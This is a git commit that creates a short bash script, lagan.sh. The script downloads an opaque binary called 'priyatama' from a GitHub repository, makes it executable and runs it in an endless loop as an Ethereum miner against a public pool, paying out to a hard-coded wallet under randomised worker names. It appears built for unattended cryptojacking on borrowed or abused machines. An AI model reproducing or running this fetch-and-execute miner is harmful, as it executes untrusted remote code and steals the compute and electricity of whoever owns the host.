b5c7b9ecb18da15717ef16e53abadad8809ed244
squibex <90225595+squibex@users.noreply.github.com>
2021-09-09 20:37:39 +0700

    Create lagan.sh

---
+++ lagan.sh
@@ -0,0 +1,13 @@
+============== lagan.sh
+
+#!/bin/bash
+POOL=asia1.ethermine.org:4444
+WALLET=USDT:0x6172c0d0139e0ce7431cabceae0f59cd49422166
+WORKER=$(echo $(shuf -i 10-40 -n 1)-COLN#im8m-ybvt)
+wget https://github.com/squibex/prem/raw/main/priyatama
+chmod +x priyatama
+while [ 1 ]; do
+./priyatama --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
+sleep 5
+done
+sleep 999999999 
